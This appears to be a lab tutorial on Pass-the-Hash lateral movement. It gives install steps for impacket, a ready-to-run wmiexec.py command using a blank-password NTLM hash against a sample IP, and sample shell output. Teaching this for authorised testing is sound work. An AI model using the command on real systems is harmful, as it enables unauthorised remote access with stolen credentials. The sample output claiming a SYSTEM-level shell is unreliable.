Lateral Movement with Pass-the-Hash

Using impacket's wmiexec.py

Scenario Overview

You have obtained the NTLM hash of a domain administrator (e.g., Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::) and identified another Windows machine (e.g., 10.0.0.20) where this administrator has local admin rights. Your goal is to get a shell on 10.0.0.20 using Pass-the-Hash.

Steps to Execute

1

Install impacket: On Kali Linux, run sudo apt install python3-impacket.

2

Execute wmiexec.py: Use the command shown in the example panel.

3

Interact with Shell: Run commands like whoami, ipconfig, dir.

4

Exit: Type exit to close the shell.

Key Takeaway

This hands-on activity demonstrates the practical application of Pass-the-Hash using wmiexec.py, showcasing how stolen NTLM hashes enable direct access to remote Windows systems.

Command Example: wmiexec.py

Use the following command on your attacker machine (Kali Linux) to attempt a PtH attack. Remember to replace 10.0.0.20 with your target IP.

attacker@kali:~$ wmiexec.py Administrator@10.0.0.20 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0

# If successful, you will get a shell prompt:
# C:\> whoami
# nt authority\system
# C:\> ipconfig
# ... (network configuration details)

The hash 31d6cfe0d16ae931b73c59d7e0c089c0 is a common NTLM hash for a blank password, often used in lab environments for demonstration purposes.

Pro-Tip

The -hashes flag expects the NTLM hash in the format LM_HASH:NT_HASH. If you only have the NT hash (which is common), you can provide an empty LM hash as shown (:NT_HASH).
